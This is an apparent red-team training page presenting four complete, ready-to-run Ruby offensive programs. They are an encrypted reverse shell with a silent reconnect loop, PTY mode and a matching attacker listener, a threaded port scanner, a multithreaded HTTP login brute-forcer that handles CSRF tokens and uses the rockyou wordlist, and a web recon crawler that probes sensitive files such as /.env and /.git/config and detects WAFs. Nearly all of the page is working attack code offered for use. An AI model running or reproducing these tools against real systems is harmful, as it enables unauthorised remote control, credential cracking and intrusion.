---
layout: training-page
title: "Ruby Offensive Tools — Red Team Academy"
module: "Programming"
tags:
  - ruby
  - offensive-tools
  - red-team
  - exploitation
page_key: "prog-ruby-offensive-tools"
render_with_liquid: false
---

# Ruby Offensive Tools

Four complete, standalone Ruby programs for common red team operations. Each script is self-contained with no external gem dependencies beyond Ruby's stdlib and OpenSSL (which ships with Ruby). All require Ruby 3.3+.

---

## Program 1: Encrypted Reverse Shell

A reverse shell that encrypts all traffic with AES-256-CBC. The IV is prepended to each ciphertext block. Supports a reconnect loop and optional PTY mode for fully interactive sessions.

```ruby
#!/usr/bin/env ruby
# encrypted_revshell.rb
#
# Usage:
#   # On attacker machine, listen with socat or a custom decryptor:
#   ruby encrypted_revshell.rb <RHOST> <RPORT> [<KEY>]
#
# Example:
#   ruby encrypted_revshell.rb 10.0.0.1 4444 mysecretpassphrase
#
# The listener side must implement the same AES-256-CBC framing.
# A matching listener is included as a comment at the bottom.

require 'socket'
require 'openssl'
require 'open3'
require 'base64'

RHOST      = ARGV[0] || '10.0.0.1'
RPORT      = (ARGV[1] || 4444).to_i
PASSPHRASE = ARGV[2] || 'defaultpassphrase'
KEY        = OpenSSL::Digest::SHA256.digest(PASSPHRASE)  # 32-byte key
RECONNECT_DELAY = 10

# ---------------------------------------------------------------------------
# Crypto helpers
# ---------------------------------------------------------------------------

def encrypt(plaintext, key)
  cipher = OpenSSL::Cipher.new('AES-256-CBC')
  cipher.encrypt
  cipher.key = key
  iv = cipher.random_iv
  ct = cipher.update(plaintext.to_s) + cipher.final
  # Format: 4-byte big-endian length + IV(16) + ciphertext
  payload = iv + ct
  [payload.bytesize].pack('N') + payload
end

def decrypt(data, key)
  return nil if data.bytesize < 20
  iv = data[0, 16]
  ct = data[16..]
  decipher = OpenSSL::Cipher.new('AES-256-CBC')
  decipher.decrypt
  decipher.key = key
  decipher.iv  = iv
  decipher.update(ct) + decipher.final
rescue OpenSSL::Cipher::CipherError
  nil
end

# ---------------------------------------------------------------------------
# Read a length-prefixed encrypted frame from the socket
# ---------------------------------------------------------------------------

def recv_frame(sock)
  len_bytes = sock.read(4)
  return nil unless len_bytes && len_bytes.bytesize == 4
  length = len_bytes.unpack1('N')
  return nil if length > 65_536  # Sanity limit
  sock.read(length)
rescue => e
  nil
end

# ---------------------------------------------------------------------------
# Execute command and return combined output
# ---------------------------------------------------------------------------

def run_command(cmd)
  cmd = cmd.strip
  return "exit\n" if cmd.downcase == 'exit'
  out, err, _status = Open3.capture3(cmd)
  combined = out + err
  combined.empty? ? "(no output)\n" : combined
rescue => e
  "Error: #{e.message}\n"
end

# ---------------------------------------------------------------------------
# PTY interactive shell mode (Linux/macOS)
# ---------------------------------------------------------------------------

def pty_shell(sock)
  require 'pty'
  pty_r, pty_w, pid = PTY.spawn('/bin/bash')

  # PTY output -> encrypted socket
  reader = Thread.new do
    loop do
      data = pty_r.readpartial(4096) rescue nil
      break if data.nil?
      sock.write(encrypt(data, KEY)) rescue break
    end
  end

  # Encrypted socket -> PTY input
  loop do
    frame = recv_frame(sock)
    break if frame.nil?
    cmd = decrypt(frame, KEY)
    break if cmd.nil? || cmd.strip == 'exit'
    pty_w.write(cmd) rescue break
  end

  reader.kill rescue nil
  Process.kill('HUP', pid) rescue nil
  Process.wait(pid) rescue nil
end

# ---------------------------------------------------------------------------
# Main connection / command loop
# ---------------------------------------------------------------------------

def run_shell(sock)
  # Send banner
  sock.write(encrypt("[*] Connected. PID=#{Process.pid} USER=#{`whoami`.strip} OS=#{RUBY_PLATFORM}\n", KEY))

  loop do
    frame = recv_frame(sock)
    break if frame.nil?
    cmd = decrypt(frame, KEY)
    break if cmd.nil?
    cmd.strip!

    if cmd == 'exit'
      sock.write(encrypt("[*] Goodbye\n", KEY))
      break
    elsif cmd == 'pty'
      # Switch to interactive PTY mode
      pty_shell(sock)
      break
    else
      output = run_command(cmd)
      sock.write(encrypt(output, KEY))
    end
  end
end

# ---------------------------------------------------------------------------
# Reconnect loop
# ---------------------------------------------------------------------------

loop do
  begin
    sock = TCPSocket.new(RHOST, RPORT)
    sock.setsockopt(Socket::IPPROTO_TCP, Socket::TCP_NODELAY, 1)
    run_shell(sock)
  rescue Errno::ECONNREFUSED, Errno::ETIMEDOUT, SocketError => e
    # Silently wait and retry
  rescue => e
    # Unexpected error — still retry
  ensure
    sock&.close rescue nil
  end
  sleep RECONNECT_DELAY
end

# ---------------------------------------------------------------------------
# MATCHING LISTENER (run on attacker box):
#
# #!/usr/bin/env ruby
# require 'socket'; require 'openssl'
# KEY = OpenSSL::Digest::SHA256.digest('defaultpassphrase')
# def enc(pt, k)
#   c=OpenSSL::Cipher.new('AES-256-CBC'); c.encrypt; c.key=k
#   iv=c.random_iv; ct=c.update(pt.to_s)+c.final
#   p=iv+ct; [p.bytesize].pack('N')+p
# end
# def dec(data, k)
#   return nil if data.bytesize < 20
#   d=OpenSSL::Cipher.new('AES-256-CBC'); d.decrypt; d.key=k
#   d.iv=data[0,16]; d.update(data[16..])+d.final rescue nil
# end
# def recv_frame(s)
#   lb=s.read(4); return nil unless lb&.bytesize==4
#   s.read(lb.unpack1('N'))
# end
# s=TCPServer.new('0.0.0.0', 4444)
# c=s.accept
# Thread.new { loop { f=recv_frame(c); break if f.nil?; puts dec(f,KEY) } }
# loop { l=$stdin.gets; break if l.nil?; c.write(enc(l,KEY)) }
# ---------------------------------------------------------------------------
```

---

## Program 2: Threaded Port Scanner with Service ID

Pure stdlib port scanner using a thread pool and Queue. Parses complex port range expressions, banner-grabs open ports, and outputs a sorted results table.

```ruby
#!/usr/bin/env ruby
# port_scanner.rb
#
# Usage:
#   ruby port_scanner.rb <target> <port-spec> [threads]
#
# Examples:
#   ruby port_scanner.rb 10.0.0.1 1-1024
#   ruby port_scanner.rb 10.0.0.1 22,80,443,3389,8080-8090 50
#   ruby port_scanner.rb 10.0.0.1 1-65535 200

require 'socket'
require 'thread'

TARGET    = ARGV[0] || abort("Usage: #{$0} <target> <port-spec> [threads]")
PORT_SPEC = ARGV[1] || abort("Usage: #{$0} <target> <port-spec> [threads]")
THREADS   = (ARGV[2] || 50).to_i
TIMEOUT   = 2  # seconds

# ---------------------------------------------------------------------------
# Parse port specification: "22,80,1-1024,8080-8090"
# ---------------------------------------------------------------------------

def parse_ports(spec)
  ports = []
  spec.split(',').each do |part|
    if part.include?('-')
      start_port, end_port = part.split('-', 2).map(&:to_i)
      ports.concat((start_port..end_port).to_a)
    else
      ports << part.to_i
    end
  end
  ports.select { |p| p >= 1 && p <= 65_535 }.uniq.sort
end

# ---------------------------------------------------------------------------
# Attempt connection and optional banner grab
# ---------------------------------------------------------------------------

def probe_port(host, port, timeout)
  Socket.tcp(host, port, connect_timeout: timeout) do |sock|
    sock.setsockopt(Socket::IPPROTO_TCP, Socket::TCP_NODELAY, 1)
    # Short wait for banner
    readable, = IO.select([sock], nil, nil, 1.5)
    banner = readable ? sock.recv(512).encode('UTF-8', invalid: :replace, undef: :replace) : ''
    banner = banner.gsub(/[\r\n]+/, ' ').strip[0, 80]
    { port: port, open: true, banner: banner }
  end
rescue Errno::ECONNREFUSED, Errno::ETIMEDOUT, Errno::EHOSTUNREACH,
       Errno::ENETUNREACH, IO::TimeoutError, SocketError
  { port: port, open: false, banner: '' }
rescue => e
  { port: port, open: false, banner: '' }
end

# ---------------------------------------------------------------------------
# Common service names (extend as needed)
# ---------------------------------------------------------------------------

SERVICES = {
  21   => 'FTP',    22   => 'SSH',    23   => 'Telnet',  25   => 'SMTP',
  53   => 'DNS',    80   => 'HTTP',   110  => 'POP3',    111  => 'RPC',
  135  => 'MSRPC', 139  => 'NetBIOS',143  => 'IMAP',    389  => 'LDAP',
  443  => 'HTTPS',  445  => 'SMB',    514  => 'Syslog',  587  => 'SMTPS',
  636  => 'LDAPS',  993  => 'IMAPS',  995  => 'POP3S',   1080 => 'SOCKS',
  1433 => 'MSSQL', 1521 => 'Oracle', 2049 => 'NFS',     3306 => 'MySQL',
  3389 => 'RDP',   5432 => 'PgSQL',  5900 => 'VNC',     6379 => 'Redis',
  8080 => 'HTTP-Alt', 8443 => 'HTTPS-Alt', 9200 => 'Elasticsearch',
  27017 => 'MongoDB'
}.freeze

# ---------------------------------------------------------------------------
# Thread pool scanner
# ---------------------------------------------------------------------------

ports    = parse_ports(PORT_SPEC)
queue    = Queue.new
results  = Queue.new
workers  = []

ports.each { |p| queue << p }
THREADS.times { queue << :stop }

puts "[*] Scanning #{TARGET} | #{ports.size} ports | #{THREADS} threads | timeout #{TIMEOUT}s"
puts "-" * 70

start_time = Time.now

THREADS.times do
  workers << Thread.new do
    loop do
      port = queue.pop
      break if port == :stop
      result = probe_port(TARGET, port, TIMEOUT)
      results << result if result[:open]
    end
  end
end

workers.each(&:join)
elapsed = (Time.now - start_time).round(2)

# ---------------------------------------------------------------------------
# Output sorted results table
# ---------------------------------------------------------------------------

open_ports = []
results.size.times { open_ports << results.pop }
open_ports.sort_by! { |r| r[:port] }

if open_ports.empty?
  puts "[-] No open ports found in #{elapsed}s"
else
  fmt = "%-7s %-12s %s"
  puts format(fmt, 'PORT', 'SERVICE', 'BANNER')
  puts "-" * 70
  open_ports.each do |r|
    svc    = SERVICES[r[:port]] || 'unknown'
    banner = r[:banner].empty? ? '(no banner)' : r[:banner]
    puts format(fmt, "#{r[:port]}/tcp", svc, banner)
  end
  puts "-" * 70
  puts "[+] #{open_ports.size} open port(s) found in #{elapsed}s"
end
```

---

## Program 3: HTTP Form Brute-Forcer

Multi-threaded HTTP form brute-forcer with CSRF token detection and cookie jar support. No external gems required.

```ruby
#!/usr/bin/env ruby
# http_brute.rb
#
# Usage:
#   ruby http_brute.rb --url <URL> --user-field <f> --pass-field <f> \
#                      --username <user> --wordlist <file> \
#                      --success <string> [--threads N] [--csrf-field <f>]
#
# Examples:
#   ruby http_brute.rb --url http://target.local/login \
#                      --user-field username --pass-field password \
#                      --username admin --wordlist /usr/share/wordlists/rockyou.txt \
#                      --success "Welcome" --threads 10
#
# The script will:
#   1. GET the login page to capture cookies + CSRF token
#   2. POST each password from the wordlist
#   3. Detect success by checking response body for --success string

require 'net/http'
require 'openssl'
require 'uri'
require 'thread'

# ---------------------------------------------------------------------------
# Argument parsing (no external gems)
# ---------------------------------------------------------------------------

def parse_args(argv)
  args = {}
  i = 0
  while i < argv.size
    case argv[i]
    when '--url'        then args[:url]        = argv[i+1]; i += 2
    when '--user-field' then args[:user_field] = argv[i+1]; i += 2
    when '--pass-field' then args[:pass_field] = argv[i+1]; i += 2
    when '--username'   then args[:username]   = argv[i+1]; i += 2
    when '--wordlist'   then args[:wordlist]   = argv[i+1]; i += 2
    when '--success'    then args[:success]    = argv[i+1]; i += 2
    when '--threads'    then args[:threads]    = argv[i+1].to_i; i += 2
    when '--csrf-field' then args[:csrf_field] = argv[i+1]; i += 2
    else i += 1
    end
  end
  args
end

ARGS = parse_args(ARGV)

required = [:url, :user_field, :pass_field, :username, :wordlist, :success]
missing = required.reject { |k| ARGS[k] }
unless missing.empty?
  abort "Missing required arguments: #{missing.map { |m| "--#{m.to_s.tr('_','-')}" }.join(', ')}\nSee script header for usage."
end

THREADS     = ARGS[:threads] || 5
CSRF_FIELD  = ARGS[:csrf_field]

# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def make_http(uri)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl    = (uri.scheme == 'https')
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  http.open_timeout = 5
  http.read_timeout = 10
  http
end

def parse_cookies(response, existing = {})
  cookies = existing.dup
  Array(response.get_fields('set-cookie')).each do |sc|
    pair = sc.split(';').first
    name, value = pair.split('=', 2)
    cookies[name.strip] = value.to_s.strip
  end
  cookies
end

def cookie_header(jar)
  jar.map { |k, v| "#{k}=#{v}" }.join('; ')
end

# ---------------------------------------------------------------------------
# Detect CSRF token from response body
# ---------------------------------------------------------------------------

CSRF_PATTERNS = [
  /input[^>]+name=["'](_token|csrf_token|authenticity_token|__RequestVerificationToken|_csrf)[^>]+value=["']([^"']+)/i,
  /name=["']([^"']*csrf[^"']*)[^>]+value=["']([^"']+)/i,
  /value=["']([^"']+)["'][^>]+name=["']([^"']*csrf[^"']*)/i,
  /"csrf[-_]?token"\s*:\s*"([^"]+)"/i
].freeze

def extract_csrf(body, field_override = nil)
  CSRF_PATTERNS.each do |pat|
    m = body.match(pat)
    if m
      # Return field_name => value
      return { (field_override || m[1]) => m[2] } if m.size == 3
      return { (field_override || 'csrf_token') => m[1] } if m.size == 2
    end
  end
  {}
end

# ---------------------------------------------------------------------------
# Fetch login page — get cookies + CSRF token
# ---------------------------------------------------------------------------

def preflight(uri)
  http = make_http(uri)
  http.start do |h|
    req = Net::HTTP::Get.new(uri)
    req['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    res = h.request(req)
    cookies = parse_cookies(res)
    csrf    = extract_csrf(res.body.to_s, CSRF_FIELD)
    [cookies, csrf]
  end
rescue => e
  abort "Preflight failed: #{e.message}"
end

# ---------------------------------------------------------------------------
# Attempt a single login
# ---------------------------------------------------------------------------

def try_login(uri, user_field, pass_field, username, password, cookies, csrf)
  http = make_http(uri)
  http.start do |h|
    req = Net::HTTP::Post.new(uri)
    req['User-Agent']   = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    req['Content-Type'] = 'application/x-www-form-urlencoded'
    req['Cookie']       = cookie_header(cookies) unless cookies.empty?
    req['Referer']      = uri.to_s

    form_data = { user_field => username, pass_field => password }
    form_data.merge!(csrf)
    req.set_form_data(form_data)

    res = h.request(req)
    new_cookies = parse_cookies(res, cookies)
    [res, new_cookies]
  end
rescue => e
  [nil, cookies]
end

# ---------------------------------------------------------------------------
# Main brute-force logic
# ---------------------------------------------------------------------------

target_uri = URI(ARGS[:url])

puts "[*] Target    : #{target_uri}"
puts "[*] Username  : #{ARGS[:username]}"
puts "[*] Wordlist  : #{ARGS[:wordlist]}"
puts "[*] Threads   : #{THREADS}"
puts "[*] Indicator : #{ARGS[:success]}"
puts "-" * 60

# Load wordlist
passwords = File.readlines(ARGS[:wordlist], chomp: true).reject(&:empty?)
puts "[*] Loaded #{passwords.size} passwords"

# Initial preflight
base_cookies, base_csrf = preflight(target_uri)
puts "[*] Cookies: #{base_cookies.keys.join(', ')}" unless base_cookies.empty?
puts "[*] CSRF field: #{base_csrf.keys.first}" unless base_csrf.empty?

queue   = Queue.new
found   = Queue.new
counter = Mutex.new
checked = 0

passwords.each { |p| queue << p }
THREADS.times  { queue << :stop }

workers = THREADS.times.map do
  Thread.new do
    # Each thread does its own preflight for fresh cookies + CSRF
    thread_uri     = URI(ARGS[:url])
    thread_cookies, thread_csrf = preflight(thread_uri)

    loop do
      password = queue.pop
      break if password == :stop
      break unless found.empty?  # Stop if we found a hit

      res, new_cookies = try_login(
        thread_uri,
        ARGS[:user_field], ARGS[:pass_field],
        ARGS[:username], password,
        thread_cookies, thread_csrf
      )

      counter.synchronize { checked += 1 }

      if res && res.body.to_s.include?(ARGS[:success])
        found << { password: password, code: res.code, cookies: new_cookies }
        print "\r[+] HIT! Username: #{ARGS[:username]} | Password: #{password}    \n"
      else
        # Re-fetch CSRF for next attempt (some apps rotate tokens)
        thread_cookies, thread_csrf = preflight(thread_uri)
        print "\r[-] Tried #{checked}/#{passwords.size}: #{password.ljust(30)}"
      end
    end
  end
end

workers.each(&:join)
puts

if found.empty?
  puts "[-] No valid credentials found"
else
  hit = found.pop
  puts "\n[+] CREDENTIALS FOUND"
  puts "    Username : #{ARGS[:username]}"
  puts "    Password : #{hit[:password]}"
  puts "    Status   : #{hit[:code]}"
  puts "    Cookies  : #{hit[:cookies].map { |k,v| "#{k}=#{v}" }.join('; ')}"
end
```

---

## Program 4: Web Application Recon Tool

Crawls a target web application and collects URLs, forms, HTML comments, JavaScript files, and interesting paths. Outputs a JSON report.

```ruby
#!/usr/bin/env ruby
# web_recon.rb
#
# Usage:
#   ruby web_recon.rb <URL> [depth]
#
# Examples:
#   ruby web_recon.rb http://target.local 2
#   ruby web_recon.rb https://target.local/app 3
#
# Output: writes target_recon.json in the current directory

require 'net/http'
require 'openssl'
require 'uri'
require 'json'
require 'set'

TARGET_URL = ARGV[0] || abort("Usage: #{$0} <URL> [depth]")
MAX_DEPTH  = (ARGV[1] || 2).to_i

INTERESTING_PATHS = %w[
  /robots.txt /sitemap.xml /.git/HEAD /.git/config /.env /.env.local
  /wp-admin /wp-login.php /wp-config.php /phpinfo.php /server-status
  /server-info /.htaccess /admin /admin.php /administrator /backup
  /api /api/v1 /api/v2 /swagger /swagger-ui.html /openapi.json
  /actuator /actuator/env /actuator/health /metrics
  /console /phpmyadmin /adminer.php /.DS_Store /.svn/entries
].freeze

WAF_SIGNATURES = {
  'Cloudflare'   => /cloudflare|__cfduid/i,
  'ModSecurity'  => /mod_security|modsecurity/i,
  'AWS WAF'      => /awswaf|x-amzn/i,
  'Akamai'       => /akamai|ak_bmsc/i,
  'F5 BIG-IP'    => /BIGipServer|F5/,
  'Imperva'      => /incapsula|visid_incap/i,
  'Sucuri'       => /sucuri/i,
  'Barracuda'    => /barra_counter_session/i
}.freeze

# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def make_http(uri)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl     = (uri.scheme == 'https')
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  http.open_timeout = 5
  http.read_timeout = 10
  http
end

def http_get(url, cookies = {})
  uri = URI(url)
  make_http(uri).start do |h|
    req = Net::HTTP::Get.new(uri)
    req['User-Agent'] = 'Mozilla/5.0 (compatible; ReconBot/1.0)'
    req['Cookie']     = cookies.map { |k,v| "#{k}=#{v}" }.join('; ') unless cookies.empty?
    res = h.request(req)
    [res.code.to_i, res.body.to_s, res.to_hash]
  end
rescue => e
  [0, '', {}]
end

def http_head(url)
  uri = URI(url)
  make_http(uri).start do |h|
    req = Net::HTTP::Head.new(uri)
    req['User-Agent'] = 'Mozilla/5.0'
    res = h.request(req)
    [res.code.to_i, res.to_hash]
  end
rescue
  [0, {}]
end

# ---------------------------------------------------------------------------
# Parsers
# ---------------------------------------------------------------------------

def extract_links(body, base_uri)
  links = Set.new
  # href and src attributes
  body.scan(/(?:href|src|action)\s*=\s*["']([^"'#][^"']*?)["']/i) do |m|
    url = m[0].strip
    next if url.start_with?('mailto:', 'javascript:', 'tel:', 'data:')
    begin
      resolved = URI.join(base_uri.to_s, url).to_s.split('#').first
      links << resolved
    rescue URI::InvalidURIError, URI::BadURIError
    end
  end
  links
end

def extract_forms(body, base_uri)
  forms = []
  body.scan(/<form([^>]*)>(.*?)<\/form>/mi) do |attrs, inner|
    method = attrs.match(/method\s*=\s*["']?(\w+)/i)&.[](1)&.upcase || 'GET'
    action = attrs.match(/action\s*=\s*["']([^"']*)/i)&.[](1) || base_uri.path
    begin
      action_url = URI.join(base_uri.to_s, action).to_s
    rescue
      action_url = action
    end

    fields = []
    inner.scan(/<input([^>]*)>/i) do |finput|
      name  = finput[0].match(/name\s*=\s*["']([^"']*)/i)&.[](1)
      type  = finput[0].match(/type\s*=\s*["']([^"']*)/i)&.[](1) || 'text'
      value = finput[0].match(/value\s*=\s*["']([^"']*)/i)&.[](1)
      fields << { name: name, type: type, value: value }.compact if name
    end

    inner.scan(/<textarea([^>]*)>/i) do |ta|
      name = ta[0].match(/name\s*=\s*["']([^"']*)/i)&.[](1)
      fields << { name: name, type: 'textarea' } if name
    end

    inner.scan(/<select([^>]*)>/i) do |sel|
      name = sel[0].match(/name\s*=\s*["']([^"']*)/i)&.[](1)
      fields << { name: name, type: 'select' } if name
    end

    forms << { method: method, action: action_url, fields: fields }
  end
  forms
end

def extract_comments(body)
  body.scan(/<!--(.*?)-->/m).map { |c| c[0].strip }
    .reject { |c| c.length < 4 || c.start_with?('[if', '[endif') }
    .uniq
end

def extract_js_files(body, base_uri)
  js_files = Set.new
  body.scan(/<script[^>]+src\s*=\s*["']([^"']+\.js[^"']*)/i) do |m|
    begin
      js_files << URI.join(base_uri.to_s, m[0]).to_s
    rescue
    end
  end
  js_files
end

def detect_waf(headers_hash, body)
  detected = []
  header_str = headers_hash.to_s
  WAF_SIGNATURES.each do |waf, pattern|
    if header_str.match?(pattern) || body.match?(pattern)
      detected << waf
    end
  end
  detected
end

def in_scope?(url, base_host)
  begin
    URI(url).host == base_host
  rescue
    false
  end
end

# ---------------------------------------------------------------------------
# Crawl engine
# ---------------------------------------------------------------------------

def crawl(start_url, max_depth)
  base_uri  = URI(start_url)
  base_host = base_uri.host

  visited   = Set.new
  queue     = [[start_url, 0]]
  results   = {
    urls:        [],
    forms:       [],
    comments:    [],
    js_files:    [],
    interesting: {},
    headers:     {},
    waf:         []
  }

  until queue.empty?
    url, depth = queue.shift
    next if visited.include?(url)
    next if depth > max_depth
    visited << url

    print "\r[*] Crawling (#{visited.size} visited): #{url[0,80].ljust(80)}"

    code, body, headers = http_get(url)
    next if code == 0

    results[:urls] << url
    results[:headers][url] = {
      code:          code,
      server:        headers['server']&.first,
      x_powered_by:  headers['x-powered-by']&.first,
      content_type:  headers['content-type']&.first
    }.compact

    # WAF detection on first page
    if visited.size == 1
      results[:waf] = detect_waf(headers, body)
    end

    # Parse page
    page_uri = URI(url)
    results[:forms]    += extract_forms(body, page_uri)
    results[:comments] += extract_comments(body)
    results[:js_files] += extract_js_files(body, page_uri).to_a

    # Enqueue child links (same domain, within depth)
    if depth < max_depth
      extract_links(body, page_uri).each do |link|
        next unless in_scope?(link, base_host)
        next if visited.include?(link)
        queue << [link, depth + 1]
      end
    end
  end

  puts "\n[*] Crawl complete. #{visited.size} pages visited."
  results
end

# ---------------------------------------------------------------------------
# Check interesting paths
# ---------------------------------------------------------------------------

def check_interesting(base_url, results)
  base_uri = URI(base_url)
  base     = "#{base_uri.scheme}://#{base_uri.host}:#{base_uri.port}"

  print "[*] Checking #{INTERESTING_PATHS.size} interesting paths..."

  INTERESTING_PATHS.each do |path|
    url  = base + path
    code, headers = http_head(url)
    next if [0, 404, 400].include?(code)
    results[:interesting][path] = { code: code, content_type: headers['content-type']&.first }
    print "\n[+] #{code} #{path}"
  end

  puts "\n[*] Interesting path check complete."
  results
end

# ---------------------------------------------------------------------------
# Deduplicate and clean results
# ---------------------------------------------------------------------------

def finalize(results)
  results[:urls]     = results[:urls].uniq.sort
  results[:forms]    = results[:forms].uniq
  results[:comments] = results[:comments].uniq
  results[:js_files] = results[:js_files].uniq.sort
  results
end

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

puts "[*] Web Application Recon Tool"
puts "[*] Target : #{TARGET_URL}"
puts "[*] Depth  : #{MAX_DEPTH}"
puts "-" * 60

results = crawl(TARGET_URL, MAX_DEPTH)
results = check_interesting(TARGET_URL, results)
results = finalize(results)

# Summary
puts "\n" + "=" * 60
puts "[+] RESULTS SUMMARY"
puts "    URLs crawled     : #{results[:urls].size}"
puts "    Forms found      : #{results[:forms].size}"
puts "    Comments found   : #{results[:comments].size}"
puts "    JS files         : #{results[:js_files].size}"
puts "    Interesting paths: #{results[:interesting].size}"
puts "    WAF detected     : #{results[:waf].join(', ').then { |w| w.empty? ? 'None detected' : w }}"

# Interesting paths detail
unless results[:interesting].empty?
  puts "\n[+] INTERESTING PATHS:"
  results[:interesting].each do |path, info|
    puts "    #{info[:code]} #{path} [#{info[:content_type]}]"
  end
end

# Forms detail
unless results[:forms].empty?
  puts "\n[+] FORMS FOUND:"
  results[:forms].uniq { |f| f[:action] }.each do |form|
    puts "    #{form[:method]} #{form[:action]}"
    form[:fields].each { |f| puts "      - #{f[:name]} (#{f[:type]})" }
  end
end

# Write JSON report
outfile = "#{URI(TARGET_URL).host}_recon.json"
File.write(outfile, JSON.pretty_generate(results))
puts "\n[+] JSON report written to: #{outfile}"
```

---

## Resources

- [Ruby Standard Library Documentation](https://ruby-doc.org/stdlib/)
- [Metasploit Rex Source](https://github.com/rapid7/rex-core)
- [PayloadsAllTheThings — Ruby Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ruby)
- [ruby-nmap gem](https://github.com/sophsec/ruby-nmap)
- [SecLists Wordlists](https://github.com/danielmiessler/SecLists)
- [net-ssh gem](https://github.com/net-ssh/net-ssh)
- [Open3 docs](https://ruby-doc.org/stdlib/libdoc/open3/rdoc/Open3.html)
